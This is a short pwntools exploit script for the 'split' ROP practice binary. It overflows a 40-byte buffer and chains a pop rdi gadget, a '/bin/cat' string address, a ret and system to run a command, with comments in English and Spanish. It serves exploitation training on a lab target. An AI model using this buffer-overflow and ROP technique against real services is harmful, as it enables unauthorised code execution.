#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary = ELF('./split')
context.bits = 64

#libc = elf.libc
rop = ROP(elf)

gs = '''
continue
'''

def start():
    if args.GDB:
       #return gdb.attach(process(elf.path), gs)
       return gdb.debug('./split', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process(elf.path)
r = start()

#========= exploit here ===================

poprdi = rop.rdi.address
binsh = next(elf.search(b'/bin/cat'))
system = elf.sym.system
ret = rop.ret.address

payload = b'A'*40
#We control the buffer overflow
#payload += 'BBBBBBB'
#payload += 'CCCCCCC'
#We have to find address of pop rdi = ropper --file split --search 'pop rdi'
#Saca lo que sea que este en el stack y hace un pop en el rdi
payload += p64(poprdi)
#now we have to find the addresses of binsh and system
payload += p64(binsh)
#in ubuntu we have to add ret address to aline the stack
payload += p64(ret)
payload += p64(system)

r.sendlineafter('>', payload)
#========= interactive ====================
r.interactive()
